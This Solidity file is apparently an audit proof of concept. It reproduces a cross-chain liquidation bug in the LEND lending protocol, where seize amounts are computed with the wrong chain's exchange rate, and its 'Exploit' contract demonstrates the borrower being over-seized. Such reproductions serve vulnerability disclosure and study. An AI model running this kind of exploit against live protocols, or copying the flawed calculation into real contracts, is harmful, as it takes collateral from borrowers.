// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND cross-chain lending finding
// 58374 (H-5): "wrong calculation of amount of Ltokens to seize in
// liquidateCrossChain function".
//
// Real audited source (the vulnerable seize-calc call is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fn     _executeLiquidationCore  (the liquidateCalculateSeizeTokens call, L268-269)
//   file   Lend-V2/src/Lendtroller.sol
//   fn     liquidateCalculateSeizeTokens  (L852-888, reproduced VERBATIM)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/321
//
// Root cause: cross-chain liquidation runs on Chain B (where the debt lives).
// The number of collateral lTokens to seize is computed on Chain B via
// `liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, ...)`,
// where `params.lTokenToSeize` is the CHAIN B version of the collateral lToken
// (the @> line). That function divides by `LToken(lTokenCollateral).
// exchangeRateStored()` — i.e. Chain B's exchange rate. But the seize actually
// happens on Chain A against the Chain A collateral lToken, whose exchange rate
// differs. So `seizeTokens` is the wrong lToken count for Chain A: the borrower
// is over- (or under-) seized. Here Chain B rate = 0.2 and Chain A rate = 0.4,
// so the protocol seizes 550e18 lTokens when the correct amount is 275e18 —
// the borrower is robbed of an EXTRA 275e18 collateral lTokens.
//
// The seize arithmetic (ExponentialNoError Exp math + the liquidateCalculate-
// SeizeTokens body) is byte-for-byte the on-chain source. Non-vulnerable
// dependencies (LendStorage maps, the LayerZero `_send` + Chain A seize, the
// price oracle, the collateral lToken balances) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Verbatim subset of Compound/Lend `ExponentialNoError` — the fixed-point
///      Exp math used by `liquidateCalculateSeizeTokens`. Reproduced so the
///      seize expression is byte-identical to the audited source.
contract ExponentialNoError {
    uint256 constant expScale = 1e18;
    uint256 constant doubleScale = 1e36;
    uint256 constant halfExpScale = expScale / 2;
    uint256 constant mantissaOne = expScale;

    struct Exp {
        uint256 mantissa;
    }

    struct Double {
        uint256 mantissa;
    }

    function truncate(Exp memory exp) internal pure returns (uint256) {
        return exp.mantissa / expScale;
    }

    function mul_ScalarTruncate(Exp memory a, uint256 scalar) internal pure returns (uint256) {
        Exp memory product = mul_(a, scalar);
        return truncate(product);
    }

    function mul_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b.mantissa) / expScale});
    }

    function mul_(Exp memory a, uint256 b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b)});
    }

    function mul_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: div_(mul_(a.mantissa, expScale), b.mantissa)});
    }

    function div_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

/// @dev Verbatim `Error` enum from Lend's ErrorReporter (indices preserved).
contract LendtrollerErrorReporter {
    enum Error {
        NO_ERROR,
        UNAUTHORIZED,
        LENDTROLLER_MISMATCH,
        INSUFFICIENT_SHORTFALL,
        INSUFFICIENT_LIQUIDITY,
        INVALID_CLOSE_FACTOR,
        INVALID_COLLATERAL_FACTOR,
        INVALID_LIQUIDATION_INCENTIVE,
        MARKET_NOT_ENTERED, // no longer possible
        MARKET_NOT_LISTED,
        MARKET_ALREADY_LISTED,
        MATH_ERROR,
        NONZERO_BORROW_BALANCE,
        PRICE_ERROR,
        REJECTION,
        SNAPSHOT_ERROR,
        TOO_MANY_ASSETS,
        TOO_MUCH_REPAY,
        ASSET_NOT_FOUND
    }
}

/// @dev Minimal LToken surface the vulnerable code touches: the collateral-side
///      exchange rate, and (for the collateral lToken) the ERC20-style balance
///      that a liquidation seizes. One faithful double serves every lToken.
interface LToken {
    function exchangeRateStored() external view returns (uint256);
}

/// @dev Faithful collateral/lToken double. `exchangeRateStored()` is what the
///      seize math divides by; `balanceOf`/`seize` model the borrower's
///      `totalInvestment` collateral position that Chain A actually seizes.
contract MiniLToken is LToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 internal rate; // exchangeRateStored mantissa (1e18-scaled)
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory symbol_, uint256 rate_) {
        symbol = symbol_;
        rate = rate_;
    }

    function exchangeRateStored() external view override returns (uint256) {
        return rate;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    /// @notice Faithful model of Chain A `_handleLiquidationExecute`: reduce the
    ///         borrower's collateral position and credit the liquidator.
    function seize(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Faithful price-oracle double. Prices are equal on both chains here, so
///      the seize error comes purely from the exchange-rate mismatch.
contract MiniOracle {
    mapping(address => uint256) public priceOf;

    function setPrice(address lToken_, uint256 price_) external {
        priceOf[lToken_] = price_;
    }

    function getUnderlyingPrice(LToken lToken_) external view returns (uint256) {
        return priceOf[address(lToken_)];
    }
}

/// @dev Faithful `LendStorage` double for the two maps the vulnerable core reads.
contract LendStorage {
    struct LiquidationParams {
        address borrower;
        uint256 repayAmount;
        uint32 srcEid;
        address lTokenToSeize;
        address borrowedAsset;
        uint256 storedBorrowIndex;
        uint256 borrowPrinciple;
        address borrowedlToken;
    }

    mapping(address => address) internal _underlyingTolToken;
    mapping(bytes32 => address) internal _crossChainLTokenMap;

    function setUnderlyingTolToken(address underlying_, address lToken_) external {
        _underlyingTolToken[underlying_] = lToken_;
    }

    function underlyingTolToken(address underlying_) external view returns (address) {
        return _underlyingTolToken[underlying_];
    }

    function setCrossChainLTokenMap(address lTokenChainB_, uint32 srcEid_, address lTokenChainA_) external {
        _crossChainLTokenMap[keccak256(abi.encode(lTokenChainB_, srcEid_))] = lTokenChainA_;
    }

    function crossChainLTokenMap(address lTokenChainB_, uint32 srcEid_) external view returns (address) {
        return _crossChainLTokenMap[keccak256(abi.encode(lTokenChainB_, srcEid_))];
    }
}

/// @dev Interface the router uses to reach the Lendtroller seize calc (verbatim call site).
interface LendtrollerInterfaceV2 {
    function liquidateCalculateSeizeTokens(address lTokenBorrowed, address lTokenCollateral, uint256 actualRepayAmount)
        external
        view
        returns (uint256, uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// Lendtroller — `liquidateCalculateSeizeTokens` reproduced VERBATIM (Lendtroller.sol L852-888).
// ─────────────────────────────────────────────────────────────────────────────
contract Lendtroller is ExponentialNoError, LendtrollerErrorReporter, LendtrollerInterfaceV2 {
    MiniOracle public oracle;
    uint256 public liquidationIncentiveMantissa;

    constructor(MiniOracle oracle_, uint256 liquidationIncentiveMantissa_) {
        oracle = oracle_;
        liquidationIncentiveMantissa = liquidationIncentiveMantissa_;
    }

    function liquidateCalculateSeizeTokens(address lTokenBorrowed, address lTokenCollateral, uint256 actualRepayAmount)
        external
        view
        override
        returns (uint256, uint256)
    {
        /* Read oracle prices for borrowed and collateral markets */
        uint256 priceBorrowedMantissa = oracle.getUnderlyingPrice(LToken(lTokenBorrowed));

        uint256 priceCollateralMantissa = oracle.getUnderlyingPrice(LToken(lTokenCollateral));

        if (priceBorrowedMantissa == 0 || priceCollateralMantissa == 0) {
            return (uint256(Error.PRICE_ERROR), 0);
        }

        /*
         * Get the exchange rate and calculate the number of collateral tokens to seize:
         *  seizeAmount = actualRepayAmount * liquidationIncentive * priceBorrowed / priceCollateral
         *  seizeTokens = seizeAmount / exchangeRate
         *   = actualRepayAmount * (liquidationIncentive * priceBorrowed) / (priceCollateral * exchangeRate)
         */
        uint256 exchangeRateMantissa = LToken(lTokenCollateral).exchangeRateStored(); // Note: reverts on error

        uint256 seizeTokens;
        Exp memory numerator;
        Exp memory denominator;
        Exp memory ratio;

        numerator = mul_(Exp({mantissa: liquidationIncentiveMantissa}), Exp({mantissa: priceBorrowedMantissa}));

        denominator = mul_(Exp({mantissa: priceCollateralMantissa}), Exp({mantissa: exchangeRateMantissa}));

        ratio = div_(numerator, denominator);

        seizeTokens = mul_ScalarTruncate(ratio, actualRepayAmount);

        return (uint256(Error.NO_ERROR), seizeTokens);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CrossChainRouter — `_executeLiquidationCore` reproduced VERBATIM
// (CrossChainRouter.sol L264-285). `liquidateCrossChain` builds the params
// struct verbatim; the borrow-position validation is elided as a faithful
// reduction so the flow reaches the vulnerable core. `_send` is a faithful
// double for the LayerZero leg + Chain A `_handleLiquidationExecute` seize.
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    LendStorage public lendStorage;
    address public lendtroller;

    // faithful-double observability: what Chain A actually seized
    uint256 public lastSeizeTokens;
    address public lastDestlToken;
    address public lastLiquidator;

    constructor(LendStorage lendStorage_, address lendtroller_) {
        lendStorage = lendStorage_;
        lendtroller = lendtroller_;
    }

    function liquidateCrossChain(
        address borrower,
        uint256 repayAmount,
        uint32 srcEid,
        address lTokenToSeize,
        address borrowedAsset
    ) external {
        LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
            borrower: borrower,
            repayAmount: repayAmount,
            srcEid: srcEid,
            lTokenToSeize: lTokenToSeize, // Collateral lToken from the user's position to seize
            borrowedAsset: borrowedAsset,
            storedBorrowIndex: 0,
            borrowPrinciple: 0,
            borrowedlToken: address(0)
        });

        _validateAndPrepareLiquidation(params);
        _executeLiquidation(params);
    }

    // faithful minimal reduction of _validateAndPrepareLiquidation (borrow-position
    // lookup + close-factor bookkeeping elided; the invariants that matter to the
    // vulnerable path are preserved).
    function _validateAndPrepareLiquidation(LendStorage.LiquidationParams memory params) private view {
        require(params.borrower != msg.sender, "Liquidator cannot be borrower");
        require(params.repayAmount > 0, "Repay amount cannot be zero");
    }

    // faithful minimal reduction of _executeLiquidation (max-liquidation re-check
    // elided) — reaches the vulnerable core.
    function _executeLiquidation(LendStorage.LiquidationParams memory params) private {
        _executeLiquidationCore(params);
    }

    function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
        // Calculate seize tokens
        address borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);

        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount); // @> VULN: seizeTokens computed with Chain B's collateral lToken (params.lTokenToSeize) exchange rate, but the seize is applied to Chain A's collateral lToken (different rate) → wrong amount seized

        require(amountSeizeError == 0, "Seize calculation failed");

        // Send message to Chain A to execute the seize
        _send(
            params.srcEid,
            seizeTokens,
            params.storedBorrowIndex,
            0,
            params.borrower,
            lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            msg.sender,
            params.borrowedAsset,
            ContractType.CrossChainLiquidationExecute
        );
    }

    // Faithful double of the LayerZero `_send` + Chain A `_handleLiquidationExecute`:
    // on Chain A, `_amount` (seizeTokens) of `_destlToken` (the Chain A collateral
    // lToken) is seized from the borrower (`_sender`) and credited to the liquidator.
    function _send(
        uint32 _dstEid,
        uint256 _amount,
        uint256 _borrowIndex,
        uint256 _collateral,
        address _sender,
        address _destlToken,
        address _liquidator,
        address _srcToken,
        ContractType ctype
    ) internal {
        MiniLToken(_destlToken).seize(_sender, _liquidator, _amount);
        lastSeizeTokens = _amount;
        lastDestlToken = _destlToken;
        lastLiquidator = _liquidator;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a liquidator liquidates a cross-chain borrower. The borrower's
// collateral sits on Chain A (lCOL-A, exchange rate 0.4); the debt is on Chain B,
// where the Chain B twin lToken (lCOL-B) has exchange rate 0.2. The protocol
// seizes `seizeTokens` computed with the Chain B rate — 550e18 — instead of the
// correct 275e18 (Chain A rate), robbing the borrower of an extra 275e18 lCOL-A.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniOracle public oracle;
    MiniLToken public borrowedLToken; // child nonce 2 (Chain B borrowed lToken)
    MiniLToken public collateralLTokenB; // child nonce 3 (Chain B collateral lToken, rate 0.2)
    MiniLToken public collateralLTokenA; // child nonce 4 (Chain A collateral lToken, rate 0.4) — the seized/drained token
    Lendtroller public lendtroller; // child nonce 5
    LendStorage public lendStorage; // child nonce 6
    CrossChainRouter public router; // child nonce 7 (VULN)

    uint256 public wrongSeize; // what the protocol seized on Chain A
    uint256 public correctSeizeTokens; // what a correct Chain-A calc yields
    uint256 public overSeized; // excess robbed from the borrower
    uint256 public borrowerLoss; // total collateral lTokens taken from the borrower
    uint256 public liquidatorGain; // collateral lTokens the liquidator received
    uint256 public profit; // bug-attributable theft (== overSeized)

    address internal constant BORROWED_ASSET = address(0xBEEF); // Chain B borrowed underlying
    address internal constant BORROWER = address(0xB0B); // the victim borrower
    uint32 internal constant SRC_EID = 1; // Chain A endpoint id

    uint256 internal constant REPAY_AMOUNT = 100e18; // underlying debt repaid by the liquidator
    uint256 internal constant BORROWER_COLLATERAL = 1000e18; // borrower's Chain A collateral position
    uint256 internal constant INCENTIVE = 1.1e18; // 10% liquidation incentive
    uint256 internal constant PRICE = 1e18; // equal prices on both chains
    uint256 internal constant RATE_CHAIN_B = 2e17; // 0.2 collateral exchange rate on Chain B
    uint256 internal constant RATE_CHAIN_A = 4e17; // 0.4 collateral exchange rate on Chain A

    constructor() {
        oracle = new MiniOracle(); // nonce 1
        borrowedLToken = new MiniLToken("lBORROW", 1e18); // nonce 2
        collateralLTokenB = new MiniLToken("lCOL-B", RATE_CHAIN_B); // nonce 3
        collateralLTokenA = new MiniLToken("lCOL-A", RATE_CHAIN_A); // nonce 4 (drained token)
        lendtroller = new Lendtroller(oracle, INCENTIVE); // nonce 5
        lendStorage = new LendStorage(); // nonce 6
        router = new CrossChainRouter(lendStorage, address(lendtroller)); // nonce 7 (VULN)

        // prices (equal on both chains; only the exchange rates differ)
        oracle.setPrice(address(borrowedLToken), PRICE);
        oracle.setPrice(address(collateralLTokenB), PRICE);
        oracle.setPrice(address(collateralLTokenA), PRICE);

        // storage wiring: borrowed underlying -> Chain B borrowed lToken; and the
        // Chain B collateral lToken -> its Chain A twin (the seize destination)
        lendStorage.setUnderlyingTolToken(BORROWED_ASSET, address(borrowedLToken));
        lendStorage.setCrossChainLTokenMap(address(collateralLTokenB), SRC_EID, address(collateralLTokenA));
    }

    function run() external {
        // borrower's collateral position lives on Chain A
        collateralLTokenA.mint(BORROWER, BORROWER_COLLATERAL);
        uint256 borrowerBefore = collateralLTokenA.balanceOf(BORROWER);

        // What the seize SHOULD be: computed against the Chain A collateral lToken
        // (the fix — "use Ltoken of chainA in calculation"). Same verbatim function.
        (, correctSeizeTokens) =
            lendtroller.liquidateCalculateSeizeTokens(address(borrowedLToken), address(collateralLTokenA), REPAY_AMOUNT);

        // Liquidator triggers cross-chain liquidation on Chain B, passing the
        // Chain B collateral lToken as lTokenToSeize (as the protocol requires).
        router.liquidateCrossChain(BORROWER, REPAY_AMOUNT, SRC_EID, address(collateralLTokenB), BORROWED_ASSET);

        wrongSeize = router.lastSeizeTokens();
        borrowerLoss = borrowerBefore - collateralLTokenA.balanceOf(BORROWER);
        liquidatorGain = collateralLTokenA.balanceOf(address(this)); // this contract is the liquidator
        overSeized = borrowerLoss - correctSeizeTokens;
        profit = overSeized;

        // Harm: the borrower was seized MORE Chain A collateral lTokens than the
        // correct amount, and the excess was handed to the liquidator.
        require(wrongSeize == 550e18, "seize calc did not use Chain B rate");
        require(correctSeizeTokens == 275e18, "correct Chain A seize mismatch");
        require(borrowerLoss == wrongSeize, "borrower not seized the wrong amount");
        require(liquidatorGain == wrongSeize, "liquidator did not receive the wrong seize");
        require(borrowerLoss > correctSeizeTokens, "no over-seizure");
        require(overSeized == 275e18, "unexpected over-seizure magnitude");
    }
}
